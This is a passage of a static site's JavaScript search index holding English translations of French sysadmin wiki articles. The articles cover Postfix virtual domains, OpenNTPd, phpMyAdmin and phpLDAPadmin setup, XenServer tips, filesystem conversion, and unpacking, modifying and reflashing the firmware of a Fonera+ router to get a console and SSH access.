                description: "How to set up virtual domains in Postfix for handling multiple domains with aliases and advanced mail routing.",
                content: "Introduction linkMost Postfix systems are the final destination for only a few domain names. This includes the machine name, the [IP address] of the machine, and sometimes the parent domain name. The rest of this document will refer to these domains as canonical domains. They usually correspond to Postfix’s “local domain” address class.\nIn addition to canonical domains, Postfix can be configured to be the final destination for many other domains. These domains are called “hosted” because they are not directly associated with the machine name. These hosted domains generally correspond to Postfix’s virtual alias domain address class and/or the virtual mailbox domain address class.\nBut wait, there’s more! Postfix can be configured to be the backup MX server for other domains. In this case, Postfix is not the final destination for these domains. It keeps mail when the main MX server is not working and forwards the mail as soon as it works again.\nFinally, Postfix can be configured as a mail relay machine across the Internet. Obviously, Postfix is not the final destination for these messages.\nConfiguration linkWith the approach described in this section, each hosted domain can have its own information, email addresses, etc. However, it still uses UNIX system accounts for local deliveries.\nWith virtual alias domains, each hosted address is an alias of a UNIX system account or an external address. The following example shows how to use this mechanism for the example.com domain.\nFile: /etc/postfix/main.cf virtual_alias_domains = example.com ...other hosted domains... virtual_alias_maps = hash:/etc/postfix/virtual File: /etc/postfix/virtual postmaster@example.com postmaster info@example.com joe sales@example.com jane # Uncomment the following entry to implement a catch-all address # @example.com jim # ...virtual aliases for other domains... Notes:\nLine 2: The virtual_alias_domains parameter tells Postfix that the example.com domain is a virtual alias domain. If you forget this, Postfix will reject mail (relay denied) or won’t know how to deliver it (mail for example.com will be sent back to the machine itself). Never list a virtual alias domain in the mydestination domain list!\nLines 3-8: The /etc/postfix/virtual file contains the virtual aliases. With this example, mail from postmaster@example.com is delivered to the local postmaster while mail from sales@example.com is sent to the UNIX account jane. Mail from all other addresses in the example.com domain is rejected with the error message “User unknown”.\nLine 10: The commented entry (text after #) shows how to implement a catch-all address that receives all mail from addresses in the example.com domain not listed in the virtual alias file. This is not without risk. Spammers try to send mail that appears to come from and is destined for any possible name. A catch-all address is likely to receive many spam messages or notifications of messages sent with an address anything@example.com.\nApplying Changes linkRun the following command after modifying the virtual file:\npostmap /etc/postfix/virtual To check if one of your addresses works correctly, type this:\npostmap -q user@example.com /etc/postfix/virtual then run this command after modifying the main.cf file:\npostfix reload Note: Virtual aliases can correspond to a local address, an external address, or both. They don’t necessarily have to correspond to UNIX system accounts on your machine.\nVirtual aliases solve one problem: they allow each domain to have its own email addresses. But there’s one left: each virtual address corresponds to a UNIX account. With each new address, you increase the system’s UNIX accounts.\nAdvanced Usage linkRedirecting All Emails to One Person linkYou may want to redirect all emails from a machine or simply all emails that hit this server to a specific email address for testing purposes. This is feasible. To do this, edit the Postfix configuration file:\nFile: /etc/postfix/main.cf # we match emails we'll accept with regular expressions virtual_alias_maps = regexp:/etc/postfix/virtual Let’s create a virtual file:\nFile: /etc/postfix/virtual # redirect everything to someone who can read the emails /@/\tmoi@mycompany.com FAQ linkUser unknown in virtual alias table linkRejection from the internal server linkIf you receive an email like:\nUser unknown in virtual alias table If it’s a response from your internal server, there’s a problem with the virtual file. Check that it’s the same one in “main.cf” and that you’ve correctly executed the postmap command.\nRejection from the external server linkIf you receive an email like:\nUser unknown in virtual alias table It’s probably Amavis causing issues. To fix this problem, comment out this line in /etc/postfix/main.cf:\nFile: /etc/postfix/main.cf # receive_override_options = no_address_mappings Resources linkSecure Virtual Mailserver: Postfix + OpenLDAP + Dovecot + Jamm + SASL + SquirrelMail\nhttp://linux-attitude.fr/post/Vers-un-trou-de-ver\n"
            }
        );
    index.add(
            {
                id:  532 ,
                href: "\/Modifier_le_firmware_par_le_OpenWrt\/",
                title: "Modifying the firmware with OpenWrt",
                description: "A guide on how to modify the firmware of a Fonera+ router using OpenWrt, including extracting the original firmware, modifying it, and uploading the modified version.",
                content: "Introduction linkAs you know, some time ago, I tried to install OpenWrt on a Fonera+ (the larger one with two Ethernet connectors). After persisting, I finally managed to get something partially functional: recompiling the Fon firmware and getting both Ethernet ports working. However, WiFi still remains a problem.\nAfter a period of working on my Frankenstein-modified Foneras, I decided to try again with another approach: using the Fon binary firmware and activating a serial console. The first step was to get a binary update for the Fonera+ in the form of the file foneraplus_1.1.1.1.fon.\nThis is a gzip compressed tar archive to which Fon added a specific header as explained by Stefan Tomanek on his site. His explanations for the classic Fonera firmware seem to be perfectly valid for the Fonera+.\nModifying the firmware linkWe use cat and tail to remove the header and get a real archive:\ncat foneraplus_1.1.1.1.fon | tail -c +520 - \u003e arch.tar.gz The resulting file contains three files that are used by the router to update itself:\nhotfix image_full upgrade The image_full file is built with the kernel image, the root file system, and a checksum for the stage2 loader launched by RedBoot. A look at the content of the Fon BuildRoot Makefile (the firmware sources) and we understand the build procedure:\nthe lzma compressed kernel image is built classically the Perl script fonimage.pl adds a 12-byte header containing a CRC via the Digest::CRC module dd is used to get a file multiple of 64KB with zero padding if necessary (bs=64k conv=sync) the kernel image file doesn’t seem to be used fonimage.pl is also used to group the kernel and the root file system in squashfs. The Perl script is launched to build the complete system image with the CRC. We can conclude that the image_full file is a header/CRC of 12 bytes followed by the lzma kernel then the squashfs image of the root file system. A look at the Perl script also tells us the composition of the 12-byte header:\n4 bytes for the size 4 bytes for the CRC 4 bytes for the location of the root file system Checking is easy, just display the values using fonimage.pl manually:\n./fonimage.pl daimage vmlinux.lzma root.squashfs size : 2295397 offset: 715783 ls -l vmlinux.lzma daimage 2295409 2007-11-18 12:20 daimage 715783 2007-09-29 20:31 vmlinux.lzma The offset corresponds to the kernel size and the size corresponds to the final image size minus the header size. The numerical values are stored in the header in a specific format called unsigned long in “network” (big-endian) order. Indeed, in the header of the daimage file, we find:\nhexdump daimage | head -n 1 0000000 2300 6506 3616 ac9f 0a00 07ec 006d 8000 23006506 is actually 00230665, which is 2295397, the size of daimage minus 12. The image_full file has this header:\nhexdump image_full | head -n 1 0000000 2100 debf 14a2 9bd3 0a00 3450 006d 8000 2100debf is 0021bfde, which is 2211806. 2211806+12 equals 2211818. But the file size is 2293764. It doesn’t match! Back to the Makefile.\nAfter using the fonimage.pl script, the Makefile calls prepare_generic_squashfs declared in image.mk, an OpenWrt file. The function uses dd:\ndd if=$(1) of=$(KDIR)/tmpfile.1 bs=64k conv=sync $(call add_jffs2_mark,$(KDIR)/tmpfile.1) dd of=$(1) if=$(KDIR)/tmpfile.1 bs=64k conv=sync $(call add_jffs2_mark,$(1)) We find the padding in 64k blocks and a call to add_jffs2_mark which does:\necho -ne '\\xde\\xad\\xc0\\xde' \u003e\u003e $(1) In short:\nwe resize the image in 64k blocks we add 0xdeadc0de (Dead Code???) we resize again we add 0xdeadc0de again Let’s verify with a Fon BuildRoot compiled by ourselves:\ncd bin find .. -name *.lzma ../build_mips/linux-2.6-fonera/vmlinux.lzma find .. -name root.squashfs ../build_mips/linux-2.6-fonera/root.squashfs ../target/linux/fonera-2.6/image/fonimage.pl \\ daimage \\ ../build_mips/linux-2.6-fonera/vmlinux.lzma \\ ../build_mips/linux-2.6-fonera/root.squashfs dd if=daimage of=temp1 bs=64k conv=sync 35+1 enregistrements lus 36+0 enregistrements écrits 2359296 octets (2.4 MB) copiés, 0.00566277 seconde, 417 MB/s echo -ne '\\xde\\xad\\xc0\\xde' \u003e\u003e temp1 dd if=temp1 of=daimage1 bs=64k conv=sync 36+1 enregistrements lus 37+0 enregistrements écrits 2424832 octets (2.4 MB) copiés, 0.00597735 seconde, 406 MB/s echo -ne '\\xde\\xad\\xc0\\xde' \u003e\u003e daimage1 ls -l daimage1 openwrt-fonera-2.6.image 2424836 2007-11-18 13:37 daimage1 2424836 2007-09-29 20:31 openwrt-fonera-2.6.image md5sum daimage1 openwrt-fonera-2.6.image b57f8b2279bdb9a6483e094c58fc3381 daimage1 b57f8b2279bdb9a6483e094c58fc3381 openwrt-fonera-2.6.image Bingo! We are able to manually recreate an image. We have perfectly analyzed the build process. Now we need to reverse this process to get a kernel file and a rootfs image that we can modify.\nThe simplest way to be sure is to dismantle our own attempt. So we start by looking at the header of daimage1:\nhexdump daimage1 | head -n 1 0000000 2300 6506 3616 ac9f 0a00 07ec 006d 8000 The values we’re interested in here are:\nthe image size: 23006506 or 00230665 or 2295397 bytes the kernel size (the offset to find the rootfs): 0a0007ec or 000aec07 or 715783 We remove the header:\ncat daimage1 | tail -c +13 \u003e nohead Then the padding using the image size specified in the header:\ncat nohead | head -c +2295397 \u003e nopad Our file is now the concatenation of the kernel and rootfs. We use the offset specified in the header to retrieve the rootfs. image size - offset = rootfs size (2295397-715783=1579614):\ncat nopad | tail -c 1579614 \u003e squash While we’re at it, we also extract the kernel to have all the elements:\ncat nopad | head -c +715783 \u003e dakern Let’s check:\nmd5sum dakern ../build_mips/linux-2.6-fonera/vmlinux.lzma 0c50b77f12c3e18a91db1d027fe0ecc6 dakern 0c50b77f12c3e18a91db1d027fe0ecc6 ../build_mips/linux-2.6-fonera/vmlinux.lzma md5sum squash ../build_mips/linux-2.6-fonera/root.squashfs 19576d7b96f07ba7694d615e2afe78d1 squash 19576d7b96f07ba7694d615e2afe78d1 ../build_mips/linux-2.6-fonera/root.squashfs It works! We are able to dismantle an official Fon update. Let’s apply this to image_full:\nhexdump image_full | head -n 1 0000000 2100 debf 14a2 9bd3 0a00 3450 006d 8000 Some calculations:\nimage size: 2100debf or 0021bfde or 2211806 kernel size: 0a003450 or 000a5034 or 675892 rootfs size: 2211806-675892=1535914 Dismantling:\ncat image_full | tail -c +13 \u003e nohead cat nohead | head -c +2211806 \u003e nopad cat nopad | tail -c 1535914 \u003e squash cat nopad | head -c +675892 \u003e dakern Quick verification:\nhexdump dakern | head -n 1 0000000 006d 8000 ff00 ffff ffff ffff 00ff 0204 That’s indeed a lzma kernel header.\nNow we need to dismantle the squashfs. We’re facing several problems including lzma compression and endianness. The image is built for a big endian system (MIPS) but a PC x86 is little endian. Simply forget the idea of mounting the file system in loopback. We need to look at the unsquashfs tool, but again, many problems. After a long period of research, I finally came across a firmware modification kit: firmware_mod_tools_prebuilt.tar.gz.\nThis archive contains an unsquashfs-lzma that works perfectly with the images for the Fonera (both the new and old ones):\n/tmp/unsquashfs-lzma squash Reading a different endian SQUASHFS filesystem on squash created 407 files created 67 directories created 165 symlinks created 0 devices created 0 fifos And we find a squashfs-root directory containing the useful tree structure. A quick look in /etc/inittab and indeed, there, something is missing that I would have liked:\nttyS0::askfirst:/bin/ash --login We add it and build a brand new squashfs using the BuildRoot tools:\n/path/to/openwrt/staging_dir_mips/bin/mksquashfs-lzma \\ squashfs-root root.squashfs -nopad -noappend -root-owned -be Creating big endian 3.0 filesystem on root.squashfs, block size 65536. Big endian filesystem, data block size 65536, compressed data, compressed metadata, compressed fragments Filesystem size 1499.77 Kbytes (1.46 Mbytes) 31.47% of uncompressed filesystem size (4766.19 Kbytes) Inode table size 4801 bytes (4.69 Kbytes) 23.44% of uncompressed inode table size (20479 bytes) Directory table size 5572 bytes (5.44 Kbytes) 57.00% of uncompressed directory table size (9776 bytes) Number of duplicate files found 4 Number of inodes 639 Number of files 407 Number of fragments 28 Number of symbolic links 165 Number of device nodes 0 Number of fifo nodes 0 Number of socket nodes 0 Number of directories 67 Number of uids 1 root (0) Number of gids 0 Uploading the Firmware linkWe have a kernel and a new rootfs. We reuse the commands to create an image: fonimage.pl, dd, echo, dd, echo. We get a new image that we just need to flash on the Fonera+ via RedBoot:\nfis delete image load -r -b 0x80041000 myimage fis create -b 0x80041000 -f 0xA8040000 -l 0x00230004 -e 0x80040400 image After this operation, the Fonera+ is restarted by the reset command. No kernel messages appear, which is normal, but after the complete boot phase we do have a usable shell. The DHCP messages keep cluttering the console but it works!\nResources linkhttp://www.lefinnois.net/wp/index.php/2007/11/18/modification-du-firmware-fon-pour-une-fonera/\nhttp://www.dd-wrt.com/wiki/index.php/LaFonera_Software_Flashing\nhttp://www.dd-wrt.com/wiki/index.php/LaFonera_(fr)\nhttp://www.cure.nom.fr/blog/archives/141-Fonera-et-le-firmware-alternatif-DD-WRT.html\nhttp://www.dd-wrt.com/wiki/index.php/Wireless_Access_Point\n"
            }
        );
    index.add(
            {
                id:  533 ,
                href: "\/OpenNTPd_:_Mise_en_place_d\u0027un_serveur_NTP_sous_OpenBSD\/",
                title: "OpenNTPd: Setting up an NTP server on OpenBSD",
                description: "A guide for installing and configuring OpenNTPd on OpenBSD",
                content: "Introduction linkHaving your machines synchronized to the correct time is very practical! Especially when you’re trying to read logs from two different machines.\nFor those who need microsecond-level precision, OpenNTPd is not the right solution - use the traditional NTP server instead.\nInstallation linkNothing to do :-)\nConfiguration linkOpen the /etc/ntpd.conf file and configure it as follows:\n# $OpenBSD: ntpd.conf,v 1.8 2007/07/13 09:05:52 henning Exp $ # sample ntpd configuration file, see ntpd.conf(5) # Addresses to listen on (ntpd does not listen by default) # listen on * # sync to a single server server 0.pool.ntp.org server 1.pool.ntp.org server 2.pool.ntp.org server ntp1.jussieu.fr # use a random selection of 8 public stratum 2 servers # see http://support.ntp.org/bin/view/Servers/NTPPoolServers servers pool.ntp.org This is a basic configuration, but it works well.\nNext, edit the /etc/rc.conf.local file to indicate that the NTP server should start at boot time, and modify the line as follows:\nntpd_flags=\"-s\" Now, if you want to start the daemon to see how it works:\nntpd Verification linkTo ensure that everything is working, use this command:\ntail -f /var/log/daemon It can take up to about 4 minutes to synchronize your machine.\nManual Synchronization linkIf you want to perform a manual synchronization, use this command:\nrdate -ncv 0.pool.ntp.org Resources linkhttp://www.openntpd.org/\nhttp://www.openbsd101.com/tipstricks.html\n"
            }
        );
    index.add(
            {
                id:  534 ,
                href: "\/Modifier_les_param%C3%A8tres_de_boot\/",
                title: "Modifying Boot Parameters",
                description: "How to modify boot parameters in BSD systems by configuring boot.conf.",
                content: "Introduction linkYou may want to modify certain boot parameters (Grub equivalent). Here is some information about that.\nboot.conf linkEdit the file /etc/boot.conf:\nstty com0 19200 set tty com0 set timeout 1 Personally, I just added the “set timeout” line to 1, the other parameters were already there. For those who don’t understand these lines, I’ll explain a bit:\nstty com0 19200: Sets the baud rate of the com0 port to 19200 set tty com0: Defines the tty on com0 to initialize it set timeout 1: Sets the waiting time for the boot system (in seconds, here 1 sec) "
            }
        );
    index.add(
            {
                id:  535 ,
                href: "\/Oreon_:_Mise_en_place_d%27une_solution_simplifi%C3%A9e_et_plus_%C3%A9l%C3%A9gante_pour_Nagios\/",
                title: "Oreon: Setting up a simplified and more elegant solution for Nagios",
                description: "Overview of Oreon (now Centreon), a monitoring and network supervision software based on Nagios with an improved interface and additional features.",
                content: "Introduction linkOreon is a network monitoring and supervision software based on the most efficient Open Source information retrieval engine: Nagios.\nToday Oreon no longer exists and is called Centreon.\nThe objective of this project is to provide a new interface for Nagios, capable of giving it new functionalities while keeping the logic of its existing mechanisms. All within a modern, scalable interface designed for everyone.\nThe Oreon project benefits from a constantly growing community and unwavering investment, which allows it to make its solution increasingly robust and constantly offer innovative new tools.\nYou can find on the website, www.oreon-project.org, all the necessary information for integrating Oreon into your infrastructure:\nPackages to download Necessary documentation Appropriate community tools Professional support service Installation of Nagios linkTo install Nagios, refer to the docs in this wiki, or read this documentation written specifically for Oreon integration.\ndocumentation\nInstallation of Oreon linkYou can follow this documentation.\ndocumentation\nHowever, during the installation, I encountered some dependency issues. That’s why at the end of it, before proceeding to the web installation, enter these lines:\npear install -o -f --alldeps Mail Mail_Mime Net_SMTP Net_Socket Net_Traceroute Net_Ping Validate Image_Graph Image_GraphViz HTML_Table HTML_QuickForm_advmultiselect Auth_SASL HTTP Numbers_Roman Numbers_Words MDB2 DB_DataObject_FormBuilder DB_DataObject DB Date "
            }
        );
    index.add(
            {
                id:  536 ,
                href: "\/PhpLDAPadmin:_Mise_en_place_d\u0027une_solution_de_management_graphique_pour_OpenLDAP\/",
                title: "PhpLDAPadmin: Setting Up a Graphical Management Solution for OpenLDAP",
                description: "A guide to install and configure PhpLDAPadmin as a web-based graphical interface for managing OpenLDAP directories.",
                content: "Introduction linkManaging an OpenLDAP database is not always simple, especially when you don’t know all the fields by heart (and there are so many of them).\nHere’s a fairly simple web-based interface to use. For those curious about other graphical interfaces (non-web), there are:\nThe well-known but buggy GQ The less known but very good Apache Directory Studio Installation linkLet’s use the magic command:\napt-get install phpldapadmin Configuration linkMinimum Configuration linkEdit the file /etc/phpldapadmin/config.php and adapt these lines:\n$ldapservers-\u003eSetValue($i,'server','name','Deimos LDAP Server'); $ldapservers-\u003eSetValue($i,'server','host','127.0.0.1'); $ldapservers-\u003eSetValue($i,'server','base',array('dc=deimos,dc=fr')); $ldapservers-\u003eSetValue($i,'server','auth_type','session'); $ldapservers-\u003eSetValue($i,'login','dn','cn=admin,dc=deimos,dc=fr'); $ldapservers-\u003eSetValue($i,'login','pass','le_bon_mot_de_passe_a_entrer'); Disabling Anonymous Account linkEdit the file /etc/phpldapadmin/config.php. First, we don’t need to allow people without accounts to have read access to the LDAP through our new interface. Here’s the line to look for:\n/* Enable anonymous bind login. */ // $ldapservers-\u003eSetValue($i,'login','anon_bind',true); Replace it with:\n$ldapservers-\u003eSetValue($i,'login','anon_bind',false); Lighttpd linkA little configuration for Lighttpd? Let’s go:\n# Alias for phpldapadmin directory alias.url += ( \"/phpldapadmin\" =\u003e \"/usr/share/phpldapadmin/htdocs\" ) I think this configuration is not optimal and certainly not very secure, but at least it works.\n"
            }
        );
    index.add(
            {
                id:  537 ,
                href: "\/Xmodmap_:_mapper_tous_les_boutons_de_sa_souris\/",
                title: "Xmodmap: Map All Your Mouse Buttons",
                description: "How to map all the buttons on your mouse using Xmodmap in Linux",
                content: "Introduction linkSince Ubuntu 8.10, I had lost a small functionality - the ability to paste from clipboard using the left button representing a down arrow on a Logitech MX Revolution mouse.\nSolution linkUse xmodmap to map all the possibilities of your mouse:\nxmodmap -e \"pointer = 1 8 3 4 5 6 7 2 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32\" You can also use BTNX if you want to assign certain buttons to specific applications or simply standard actions.\n"
            }
        );
    index.add(
            {
                id:  538 ,
                href: "\/PhpMyAdmin_:_Installation_et_configuration\/",
                title: "PhpMyAdmin: Installation and Configuration",
                description: "Guide for installing and configuring PhpMyAdmin, a web interface for MySQL database management",
                content: "Introduction linkphpMyAdmin (pronounced “p h p my admin”) is a free, user-friendly interface written in PHP for the MySQL DBMS to facilitate the management of MySQL databases on a server, and is distributed under the GNU GPL license.\nIt is one of the most famous interfaces for managing a MySQL database on a PHP server. Many hosting providers, whether free or paid, offer it, which means the user doesn’t have to install it. Among them, we can mention Free or Lycos Multimania.\nThis practical interface allows you to easily execute many queries without extensive knowledge in the database field, such as table creation, insertions, updates, deletions, and modifications to database structure. This system is very convenient for backing up a database as an .sql file, making it easy to transfer data. It also accepts SQL queries directly in SQL language, which allows you to test your queries, for example when creating a website, saving precious time.\nInstallation linkTo install it, you must first have installed MySQL Server! Once that’s done, let’s install phpMyAdmin:\napt-get install phpmyadmin Configuration linkBy default, no configuration is needed if you have installed it on the same machine as MySQL Server. Otherwise, you need to specify the address you want to connect to.\nconfig.inc.php linkMono server linkEdit the file /etc/phpmyadmin/config.inc.php, then modify this line:\n//$cfg['Servers'][$i]['host'] = 'localhost'; // MySQL hostname or IP address to:\n$cfg['Servers'][$i]['host'] = 'IP_OF_SERVER'; // MySQL hostname or IP address Uncomment the line by removing the “//” and put the IP of the server you’re interested in.\nThen, you must authorize a person to connect remotely to the server. For simplicity here, I chose root who has access to all databases, but choosing another username is not a bad idea! On the server, adapt and execute these lines:\ncreate user 'root'@'IP_OF_PHPMYADMIN' identified by '**********'; grant all privileges on * . * to 'root'@'IP_OF_PHPMYADMIN' identified by '**********' with grant option max_queries_per_hour 0 max_connections_per_hour 0 max_updates_per_hour 0 max_user_connections 0; grant all privileges on `root_%` . * to 'root'@'IP_OF_PHPMYADMIN'; flush privileges; Replace “IP_OF_PHPMYADMIN” with the IP address of the machine where phpMyAdmin is located, then replace “**” with the password you want to assign to the user.\nNow, connect via the web interface and you’ll have permission to connect.\nMulti servers linkFor a basic multi-server configuration, edit the file /etc/phpmyadmin/config.inc.php, then add these lines:\n// Add server 2 $i++; $cfg['Servers'][$i]['host'] = 'server2'; // Add server 3 $i++; $cfg['Servers'][$i]['host'] = 'server3'; Then follow the same procedure for each server as in the single server section above.\nPermanent 80% font size linkIn the latest versions of phpMyAdmin, the font is quite large (pseudo web2.0 effect?!), which is not very cool for smaller resolutions, and anyway… it’s simply ugly!\nA small CSS fix will solve this. Edit the left.php file at the root and the header.inc.php file in the libraries. Add the following code in the head tags of these pages:\nWith Lighttpd linkFor a phpMyAdmin configuration with Lighttpd, here’s what you need (/etc/lighttpd/conf-available/50-phpmyadmin.conf):\n# Alias for phpMyAdmin directory alias.url += ( \"/phpmyadmin\" =\u003e \"/usr/share/phpmyadmin\", ) # Disallow access to libraries $HTTP[\"url\"] =~ \"^/phpmyadmin/libraries\" { url.access-deny = ( \"\" ) } # Limit access to setup script $HTTP[\"url\"] =~ \"^/phpmyadmin/scripts/setup.php\" { auth.backend = \"plain\" auth.backend.plain.userfile = \"/etc/phpmyadmin/htpasswd.setup\" auth.require = ( \"/\" =\u003e ( \"method\" =\u003e \"basic\", \"realm\" =\u003e \"phpMyAdmin Setup\", \"require\" =\u003e \"valid-user\" ) ) } "
            }
        );
    index.add(
            {
                id:  539 ,
                href: "\/XenServer_5.0_:_Astuces\/",
                title: "XenServer 5.0: Tips \u0026 Tricks",
                description: "A collection of tips and tricks for XenServer 5.0, including solutions for common issues with XenCenter and boot options.",
                content: "Introduction linkXen can be very temperamental, especially the Citrix version with the incomplete XenCenter. That’s why, here are some tips to help you navigate through difficult situations.\nAdding Boot Options in XenCenter “Startup Options” linkTo add this option, which is missing when creating a VM using a template.\nYou need to access the server console and check the UUID of the concerned VM:\nxe vm-list Retrieve the UUID preceding the VM: uuid=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxxx\nThen run the following command:\nxe vm-param-set HVM-boot-policy=BIOS\\ order uuid=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxxx To verify that the command worked correctly:\nxe vm-param-list uuid=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxxx Check that the HVM-boot-policy value is indeed set to ‘BIOS order’\nIt’s quite possible that the VM will no longer boot normally with this option activated, or that you simply want to return to the original mode. To deactivate it, use the following line:\nxe vm-param-set HVM-boot-policy= uuid=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxxx "
            }
        );
    index.add(
            {
                id:  540 ,
                href: "\/Conversion_de_filesystems\/",
                title: "Filesystem Conversion",
                description: "Guide on how to convert filesystems without reformatting, focusing on converting from ext3 to ext4.",
                content: "Introduction linkSometimes you need to convert your filesystem to a more recent one when possible, without having to reformat everything.\nEXT3 -\u003e EXT4 linkIt’s obvious that the partition to be converted must be unmounted beforehand. Here, I’ll use an LVM partition in ext3 to convert it to ext4:\ntune2fs -O extents,uninit_bg,dir_index /dev/mapper/lvm-home fsck -pf /dev/mapper/lvm-home If you’re modifying the boot partition, you need to boot from a live CD for example, then run this command to revalidate grub:\ngrub-install /dev/sda Resources linkhttp://doc.ubuntu-fr.org/ext4\n"
            }
        );
    index.add(
            {
                id:  541 ,
                href: "\/activer-le-ssh-sur-sa-fonera-plus\/",
                title: "Enabling SSH on the Fonera+",
                description: "A guide to enable SSH access on a Fonera+ router by flashing it with a custom firmware.",
                content: "Introduction linkThe Fonera is a small device based on OpenWRT that allows you to distribute WiFi (HotSpot). To learn more, I invite you to visit the official website. In short, it is possible to play a bit more with the basic functions, which is why I tackled SSH access on this device.\nImportant: Any firmware modification can take 10 minutes to update. So don’t reboot before that!\nPrerequisites link A web server Apache will do fine… (on Mac: /Library/WebServer/Documents)\nRemember to turn off your firewall during the process Perl and the perl-Net-Telnet dependency: Open cpan and do:\ninstall Net::Telnet Install fping: apt-get install fping or on Mac:\nsudo port install fping This perl file redboot.pl to be placed in the root of your web server The firmware which is also to be placed in the root of your web server A direct network connection with the Fonera (via its WAN port, the black one) Configure your IP address to 192.168.1.254 Flashing with the New Firmware linkLaunch the redboot.pl script that you downloaded like this:\nperl redboot.pl 192.168.1.1 Once the connection is established, specify the Fonera’s IP:\nip_address -l 192.168.1.1/24 -h 192.168.1.254 then type:\nfis delete image load -r -b 0x80100000 /firmware_francofon.bin -m HTTP -h 192.168.1.254 fis create -b 0x80100000 -l 0x00237040 -f 0xA8040000 -e 0x80040400 -r 0x80040400 image You should see something like this:\n192.168.1.1 is unreachable 192.168.1.1 is alive -\u003e == Executing boot script in 1.910 seconds - enter ^C to abort \u003c- ^C Trying 192.168.1.1... Connected to 192.168.1.1. Escape character is '^]'. RedBoot\u003e ip_address -l 192.168.1.1/24 -h 192.168.1.254 IP: 192.168.1.1/255.255.255.0, Gateway: 0.0.0.0 Default server: 192.168.1.254 RedBoot\u003e fis delete image Delete image 'image' - continue (y/n)? y ... Erase from 0xa8040000-0xa8277040: .................................... ... Erase from 0xa87e0000-0xa87f0000: . ... Program from 0x80ff0000-0x81000000 at 0xa87e0000: . RedBoot\u003e load -r -b 0x80100000 /firmware_francofon.bin -m HTTP -h 192.168.1.254 Raw file loaded 0x80100000-0x8033703f, assumed entry at 0x80100000 RedBoot\u003e fis create -b 0x80100000 -l 0x00237040 -f 0xA8040000 -e 0x80040400 -r 0x80040400 image ... Erase from 0xa8040000-0xa8277040: .................................... ... Program from 0x80100000-0x80337040 at 0xa8040000: .................................... ... Erase from 0xa87e0000-0xa87f0000: . ... Program from 0x80ff0000-0x81000000 at 0xa87e0000: . Wait until the flashing is complete. A quick reboot:\nRedBoot\u003e reset You should now have SSH access to your Fonera :-):\nssh -l root 192.168.10.1 The authenticity of host '192.168.10.1 (192.168.10.1)' can't be establish RSA key fingerprint is 5c:d3:42:ed:52:6d:c0:c6:fb:ec:84:57:18:24:d7:be. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added '192.168.10.1' (RSA) to the list of known host root@192.168.10.1's password: BusyBox v1.4.1 (2007-09-03 10:39:50 UTC) Built-in shell (ash) Enter 'help' for a list of built-in commands. ______ __ /\\ ___\\ /\\ \\ \\ \\ \\__/ __ ___ __ _ __ __ \\_\\ \\___ \\ \\ _\\/ __`\\ /' _ `\\ /'__`\\/\\`'__\\/'__`\\ /\\___ __\\ \\ \\ \\/\\ \\L\\ \\/\\ \\/\\ \\/\\ __/\\ \\ \\//\\ \\L\\.\\_ \\/__/\\ \\_/ \\ \\_\\ \\____/\\ \\_\\ \\_\\ \\____\\\\ \\_\\\\ \\__/.\\_\\ \\ \\_\\ \\/_/\\/___/ \\/_/\\/_/\\/____/ \\/_/ \\/__/\\/_/ \\/_/ -------------- Fonera 1.5 Firmware (v1.1.1.1) ----------------- * Based on OpenWrt - http://openwrt.org * Powered by FON - http://www.fon.com ----------------------------------------------------- root@OpenWrt:~# Wow!!! Your Fonera+ is now FREE! FAQ linkThe redboot script cannot find my Fonera linkMake sure the POWER light is on. If not, unplug the Fonera for 10 seconds and then plug it back in!\nFON_ATTENTION_PLEASE_CONNECT linkWhen I scan the WiFi at home, I discover an unencrypted SSID called “FON_ATTENTION_PLEASE_CONNECT”. This is a failed flashing. So you need to download the official firmware from the official site to restore the original firmware.\nConnect to this signal and then type https://192.168.1.1. Now, upload the firmware and you will see something like this:\nFirmware upgrade and hotfix installation Ooooops! Looks like the La Fonera is not working properly. You need to reinstall the fon software in it. Please, provide a valid full firmware in the box below (you can find them at fon's download page) or contact fon support at support@fon.com FON upgrade file Upgrading... Wait for the router to reflash itself. This can take up to some minutes. DO NOT DICONNECT THE LA FONERA in 10min This is a FON reflash v2 archive Verified OK Upgrade name: reflash_all grep: /etc/hotfix: No such file or directory Upgrading FON firmware and rebooting... This may take up to 10 minutes. Please be patient. The power light will be alternating green and orange. When the process is finished the light will stay orange while rebooting Flashing image... The upgrade process was successful Press here to return to the index page Updating personal config from FON linkJust after flashing your Fonera+ will reset with factory default settings. You can verify this by going into your HTTP console on 192.168.10.1\nTo update your config, log on to www.fon.com, and access userzone. Select your router, and update WLAN private and public SSID names. If you don’t want to change the name, please just change one letter, click on “update” button, and change again to the right name. For the private WLAN: change the WEP/WPA key encryption using the same method.\nFon.com servers will send the new config to your Fonera+. Wait a few minutes and check in your local HTTP console. You don’t need to reboot.\nRegistered or not? linkIf your Fonera+ has been registered before the SSH-unlock, check on your local HTTP console status if all is OK. If the logo displayed is “your Fonera+ has not been registered”, it is important to change this parameter to give access to users on your public WLAN.\nTo do this, open SSH console:\necho 1 \u003e /etc/config/registered Reboot your Fonera+, connect again to your HTTP local console, and verify the change to the logo: “Your Fonera is registered OK”\nBandwidth, QoS, transfer rate linkOnce your Fonera+ is running, configured and registered, check your transfer rate on all ports!\nDefault settings in original FON firmware 1.1.1r1 are 1024kb/s for download and 128kb for upload (WAN port).\nAdjust these settings to your ISP speed line, in this example 2048kbs for D/L and 256 kbs for U/L.\nuci set qos.wan.upload=256 uci set qos.wan.download=2048 uci commit Reboot and perform a new speed transfer test on WLAN and LAN.\nDisable FON QoS service (not recommended):\nuci set qos.wan.enabled=0 uci commit Resources linkhttps://www.jopa.fr/index.php/2008/03/24/jouer-avec-la-fonera-2eme-partie-hacker-la-fonera/\nhttps://www.cs.helsinki.fi/u/sklvarjo/lafon.htm\nhttps://www.dd-wrt.com/dd-wrtv3/dd-wrt/downloads.html\n"
            }
        );
    index.add(
            {
                id:  542 ,
                href: "\/Linux_:_Lancement_des_d%C3%A9mons_au_boot\/",
                title: "Linux: Launching Daemons at Boot",
                description: "Guide explaining how to configure daemons to automatically start at boot time on different Linux distributions such as Debian, Red Hat, and Gentoo.",
